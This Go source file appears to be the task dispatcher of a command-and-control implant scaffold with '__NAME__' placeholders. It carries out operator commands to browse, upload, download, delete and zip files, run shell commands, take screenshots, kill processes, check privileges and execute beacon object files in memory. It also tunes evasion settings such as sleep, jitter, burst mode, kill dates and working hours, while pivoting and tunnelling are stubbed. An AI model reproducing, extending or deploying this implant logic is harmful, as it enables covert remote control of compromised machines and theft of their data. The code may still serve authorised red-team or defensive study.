package main

import (
	"archive/zip"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"

	"__NAME__/impl"
	"__NAME__/protocol"
)

var (
	burstEnabled int
	burstSleep   int
	burstJitter  int
	chunkSize    int
)

// TaskProcess dispatches each raw command object and returns response objects.
func TaskProcess(objects [][]byte) [][]byte {
	var responses [][]byte
	for _, obj := range objects {
		var cmd protocol.Command
		if err := protocol.Unmarshal(obj, &cmd); err != nil {
			continue
		}
		resp := dispatch(cmd)
		if resp != nil {
			responses = append(responses, resp)
		}
	}
	return responses
}

func dispatch(cmd protocol.Command) []byte {
	switch cmd.Code {

	case protocol.COMMAND_EXIT:
		os.Exit(0)
		return nil

	case protocol.COMMAND_REV2SELF:
		return completeResp(protocol.COMMAND_REV2SELF, cmd.Id)

	// ── File system ────────────────────────────────────────────────────────────

	case protocol.COMMAND_LS:
		var p protocol.ParamsLs
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		path, entries, err := agent.GetListing(p.Path)
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		filesBytes, _ := protocol.Marshal(entries)
		return okResp(protocol.COMMAND_LS, cmd.Id, protocol.AnsLs{Result: true, Path: path, Files: filesBytes})

	case protocol.COMMAND_UPLOAD:
		var p protocol.ParamsUpload
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		path := agent.NormalizePath(p.Path)
		if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		if err := os.WriteFile(path, p.Content, 0644); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.COMMAND_UPLOAD, cmd.Id, protocol.AnsUpload{Path: path})

	case protocol.COMMAND_DOWNLOAD:
		var p protocol.ParamsDownload
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		path := agent.NormalizePath(p.Path)
		data, err := os.ReadFile(path)
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.COMMAND_DOWNLOAD, cmd.Id, protocol.AnsDownload{Path: path, Size: len(data), Content: data, Start: true, Finish: true})

	case protocol.COMMAND_RM:
		var p protocol.ParamsRm
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		path := agent.NormalizePath(p.Path)
		if err := os.RemoveAll(path); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return completeResp(protocol.COMMAND_RM, cmd.Id)

	case protocol.COMMAND_MKDIR:
		var p protocol.ParamsMkdir
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		path := agent.NormalizePath(p.Path)
		if err := os.MkdirAll(path, 0755); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return completeResp(protocol.COMMAND_MKDIR, cmd.Id)

	case protocol.COMMAND_CP:
		var p protocol.ParamsCp
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		src := agent.NormalizePath(p.Src)
		dst := agent.NormalizePath(p.Dst)
		info, err := os.Stat(src)
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		if info.IsDir() {
			err = agent.CopyDir(src, dst)
		} else {
			err = agent.CopyFile(src, dst)
		}
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return completeResp(protocol.COMMAND_CP, cmd.Id)

	case protocol.COMMAND_MV:
		var p protocol.ParamsMv
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		src := agent.NormalizePath(p.Src)
		dst := agent.NormalizePath(p.Dst)
		if err := os.Rename(src, dst); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return completeResp(protocol.COMMAND_MV, cmd.Id)

	case protocol.COMMAND_CD:
		var p protocol.ParamsCd
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		path := agent.NormalizePath(p.Path)
		if err := os.Chdir(path); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return completeResp(protocol.COMMAND_CD, cmd.Id)

	case protocol.COMMAND_PWD:
		dir, err := os.Getwd()
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.COMMAND_PWD, cmd.Id, protocol.AnsPwd{Path: dir})

	case protocol.COMMAND_CAT:
		var p protocol.ParamsCat
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		path := agent.NormalizePath(p.Path)
		data, err := os.ReadFile(path)
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.COMMAND_CAT, cmd.Id, protocol.AnsCat{Path: p.Path, Content: data})

	case protocol.COMMAND_ZIP:
		var p protocol.ParamsZip
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		src := agent.NormalizePath(p.Src)
		dst := agent.NormalizePath(p.Dst)
		if err := zipPath(src, dst); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.COMMAND_ZIP, cmd.Id, protocol.AnsZip{Path: dst})

	// ── OS ─────────────────────────────────────────────────────────────────────

	case protocol.COMMAND_RUN:
		var p protocol.ParamsRun
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		cmdLine := strings.TrimSpace(strings.Join(append([]string{p.Program}, p.Args...), " "))
		if cmdLine == "" {
			cmdLine = p.Program
		}
		output, err := agent.RunShell(cmdLine, true, true)
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.COMMAND_RUN, cmd.Id, protocol.AnsRun{Stdout: output, Finish: true})

	case protocol.COMMAND_PS:
		procs, err := agent.ListProcesses()
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		procBytes, _ := protocol.Marshal(procs)
		return okResp(protocol.COMMAND_PS, cmd.Id, protocol.AnsPs{Result: true, Processes: procBytes})

	case protocol.COMMAND_SCREENSHOT:
		img, err := agent.CaptureScreenshot()
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.COMMAND_SCREENSHOT, cmd.Id, protocol.AnsScreenshots{Screens: [][]byte{img}})

	case protocol.COMMAND_SHELL:
		var p protocol.ParamsShell
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		cmdLine := strings.TrimSpace(strings.Join(append([]string{p.Program}, p.Args...), " "))
		output, err := agent.RunShell(cmdLine, true, true)
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.COMMAND_SHELL, cmd.Id, protocol.AnsShell{Output: output})

	case protocol.COMMAND_KILL:
		var p protocol.ParamsKill
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		proc, err := os.FindProcess(p.Pid)
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		if err := proc.Kill(); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return completeResp(protocol.COMMAND_KILL, cmd.Id)

	case protocol.COMMAND_DISKS:
		drives, err := listDrives()
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		driveBytes, _ := protocol.Marshal(drives)
		return okResp(protocol.COMMAND_DISKS, cmd.Id, protocol.AnsDisks{Drives: driveBytes})

	case protocol.COMMAND_GETUID:
		username, domain, elevated := currentIdentity()
		return okResp(protocol.COMMAND_GETUID, cmd.Id, protocol.AnsGetuid{Username: username, Domain: domain, Elevated: elevated})

	// ── Profile tuning ─────────────────────────────────────────────────────────

	case protocol.COMMAND_SLEEP:
		var p protocol.ParamsSleep
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		stateMu.Lock()
		agentSleep = p.Sleep
		agentJitter = p.Jitter
		stateMu.Unlock()
		return okResp(protocol.COMMAND_SLEEP, cmd.Id, protocol.AnsSleep{Sleep: p.Sleep, Jitter: p.Jitter})

	case protocol.COMMAND_PROFILE:
		var p protocol.ParamsProfile
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		resp := protocol.AnsProfile{SubCmd: p.SubCmd, IntValue: p.IntValue, StrValue: p.StrValue}
		switch p.SubCmd {
		case 2:
			chunkSize = p.IntValue
		case 3:
			stateMu.Lock()
			killDate = int64(p.IntValue)
			stateMu.Unlock()
		case 4:
			ws, we, err := parseWorkingTime(p.StrValue)
			if err != nil {
				return errResp(cmd.Id, err.Error())
			}
			stateMu.Lock()
			workStart = ws
			workEnd = we
			stateMu.Unlock()
			resp.StrValue = formatWorkingTime(ws, we)
		default:
			return errResp(cmd.Id, fmt.Sprintf("unsupported profile subcmd %d", p.SubCmd))
		}
		return okResp(protocol.COMMAND_PROFILE, cmd.Id, resp)

	case protocol.COMMAND_BURST:
		var p protocol.ParamsBurst
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		switch p.SubCmd {
		case 1:
			return okResp(protocol.COMMAND_BURST, cmd.Id, protocol.AnsBurst{Enabled: burstEnabled, Sleep: burstSleep, Jitter: burstJitter})
		case 2:
			burstEnabled = p.Enabled
			burstSleep = p.Sleep
			burstJitter = p.Jitter
			return okResp(protocol.COMMAND_BURST, cmd.Id, protocol.AnsBurst{Enabled: burstEnabled, Sleep: burstSleep, Jitter: burstJitter})
		default:
			return errResp(cmd.Id, fmt.Sprintf("unsupported burst subcmd %d", p.SubCmd))
		}

	case protocol.COMMAND_TERMINATE:
		return completeResp(protocol.COMMAND_TERMINATE, cmd.Id)

	// ── Pivot / tunnel / terminal extension boundaries ───────────────────────

	case protocol.COMMAND_LINK:
		return errResp(cmd.Id, "pivot link requires a transport extension in this scaffold")

	case protocol.COMMAND_UNLINK:
		return errResp(cmd.Id, "pivot unlink requires a transport extension in this scaffold")

	case protocol.COMMAND_PIVOT_EXEC:
		return errResp(cmd.Id, "pivot data routing requires a transport extension in this scaffold")

	case protocol.COMMAND_TUNNEL_START:
		return errResp(cmd.Id, "tunnel start requires a transport extension in this scaffold")

	case protocol.COMMAND_TUNNEL_STOP:
		return errResp(cmd.Id, "tunnel stop requires a transport extension in this scaffold")

	case protocol.COMMAND_TUNNEL_PAUSE:
		return errResp(cmd.Id, "tunnel pause requires a transport extension in this scaffold")

	case protocol.COMMAND_TUNNEL_RESUME:
		return errResp(cmd.Id, "tunnel resume requires a transport extension in this scaffold")

	case protocol.COMMAND_TUNNEL_REVERSE:
		return errResp(cmd.Id, "reverse tunnel requires a transport extension in this scaffold")

	case protocol.COMMAND_LPORTFWD_START:
		return errResp(cmd.Id, "local port forwarding requires a transport extension in this scaffold")

	case protocol.COMMAND_LPORTFWD_STOP:
		return errResp(cmd.Id, "local port forwarding requires a transport extension in this scaffold")

	case protocol.COMMAND_RPORTFWD_START:
		return errResp(cmd.Id, "reverse port forwarding requires a transport extension in this scaffold")

	case protocol.COMMAND_RPORTFWD_STOP:
		return errResp(cmd.Id, "reverse port forwarding requires a transport extension in this scaffold")

	case protocol.COMMAND_TERMINAL_START:
		return errResp(cmd.Id, "interactive terminal requires a platform extension in this scaffold")

	case protocol.COMMAND_TERMINAL_STOP:
		return errResp(cmd.Id, "interactive terminal requires a platform extension in this scaffold")

	// ── BOF execution ──────────────────────────────────────────────────────────

	case protocol.COMMAND_EXEC_BOF:
		var p protocol.ParamsExecBof
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		ctx := impl.ObjectExecute(p.Object, []byte(p.ArgsPack))
		ctx.Drain()
		msgs, _ := protocol.Marshal(ctx.Msgs)
		return okResp(protocol.COMMAND_EXEC_BOF, cmd.Id, protocol.AnsExecBof{Msgs: msgs})

	case protocol.COMMAND_EXEC_BOF_ASYNC:
		var p protocol.ParamsExecBof
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		jobID := jobs.Add(impl.JobTypeBof)
		runAsyncBof(p.Object, p.ArgsPack, taskRefFromCommand(p.Task, cmd.Id), jobID)
		return nil

	// ── Job management ─────────────────────────────────────────────────────────

	case protocol.COMMAND_JOB_LIST:
		list := jobs.List()
		jobInfos := make([]protocol.JobInfo, 0, len(list))
		for _, j := range list {
			jobInfos = append(jobInfos, protocol.JobInfo{
				JobId:   fmt.Sprintf("%d", j.JobId),
				JobType: j.JobType,
			})
		}
		data, _ := protocol.Marshal(jobInfos)
		return okResp(protocol.COMMAND_JOB_LIST, cmd.Id, protocol.AnsJobList{List: data})

	case protocol.COMMAND_JOB_KILL:
		var p protocol.ParamsJobKill
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		jobID, err := strconv.ParseUint(p.Id, 10, 32)
		if err != nil {
			return errResp(cmd.Id, fmt.Sprintf("invalid job id %q", p.Id))
		}
		if !jobs.Kill(uint32(jobID)) {
			return errResp(cmd.Id, fmt.Sprintf("job %s not found", p.Id))
		}
		return completeResp(protocol.COMMAND_JOB_KILL, cmd.Id)

	default:
		return errResp(cmd.Id, fmt.Sprintf("unknown command code %d", cmd.Code))
	}
}

// ─── Response helpers ──────────────────────────────────────────────────────────

func completeResp(code uint, id uint) []byte {
	data, _ := protocol.Marshal(protocol.Command{Code: code, Id: id})
	return data
}

func errResp(id uint, msg string) []byte {
	payload, _ := protocol.Marshal(protocol.AnsError{Error: msg})
	data, _ := protocol.Marshal(protocol.Command{Code: protocol.RESP_ERROR, Id: id, Data: payload})
	return data
}

func okResp(code uint, id uint, val interface{}) []byte {
	payload, _ := protocol.Marshal(val)
	data, _ := protocol.Marshal(protocol.Command{Code: code, Id: id, Data: payload})
	return data
}

func currentIdentity() (string, string, bool) {
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	domain := os.Getenv("USERDOMAIN")
	return username, domain, agent.IsElevated()
}

func listDrives() ([]protocol.DriveInfo, error) {
	if runtime.GOOS == "windows" {
		var drives []protocol.DriveInfo
		for ch := 'A'; ch <= 'Z'; ch++ {
			root := fmt.Sprintf("%c:\\", ch)
			if _, err := os.Stat(root); err == nil {
				drives = append(drives, protocol.DriveInfo{Name: root, Type: "unknown"})
			}
		}
		return drives, nil
	}
	return []protocol.DriveInfo{{Name: "/", Type: "root"}}, nil
}

func parseWorkingTime(value string) (int, int, error) {
	parts := strings.Split(value, "-")
	if len(parts) != 2 {
		return 0, 0, fmt.Errorf("invalid working time %q: expected HH:MM-HH:MM", value)
	}
	start, err := parseHHMM(parts[0])
	if err != nil {
		return 0, 0, err
	}
	end, err := parseHHMM(parts[1])
	if err != nil {
		return 0, 0, err
	}
	return start, end, nil
}

func parseHHMM(value string) (int, error) {
	value = strings.TrimSpace(value)
	parts := strings.Split(value, ":")
	if len(parts) != 2 {
		return 0, fmt.Errorf("invalid time %q", value)
	}
	h, err := strconv.Atoi(parts[0])
	if err != nil {
		return 0, fmt.Errorf("invalid hour in %q", value)
	}
	m, err := strconv.Atoi(parts[1])
	if err != nil {
		return 0, fmt.Errorf("invalid minute in %q", value)
	}
	if h < 0 || h > 23 || m < 0 || m > 59 {
		return 0, fmt.Errorf("invalid time %q", value)
	}
	return h*100 + m, nil
}

func formatWorkingTime(start, end int) string {
	return fmt.Sprintf("%02d:%02d-%02d:%02d", start/100, start%100, end/100, end%100)
}

func zipPath(src, dst string) error {
	if err := os.MkdirAll(filepath.Dir(dst), 0o755); err != nil {
		return err
	}
	file, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer file.Close()
	zw := zip.NewWriter(file)
	defer zw.Close()
	info, err := os.Stat(src)
	if err != nil {
		return err
	}
	baseDir := ""
	if info.IsDir() {
		baseDir = filepath.Base(src)
	}
	return filepath.Walk(src, func(path string, info os.FileInfo, walkErr error) error {
		if walkErr != nil {
			return walkErr
		}
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}
		if baseDir != "" {
			rel, err := filepath.Rel(filepath.Dir(src), path)
			if err != nil {
				return err
			}
			header.Name = rel
		} else {
			header.Name = info.Name()
		}
		if info.IsDir() {
			header.Name += "/"
			_, err = zw.CreateHeader(header)
			return err
		}
		header.Method = zip.Deflate
		writer, err := zw.CreateHeader(header)
		if err != nil {
			return err
		}
		in, err := os.Open(path)
		if err != nil {
			return err
		}
		defer in.Close()
		_, err = io.Copy(writer, in)
		return err
	})
}
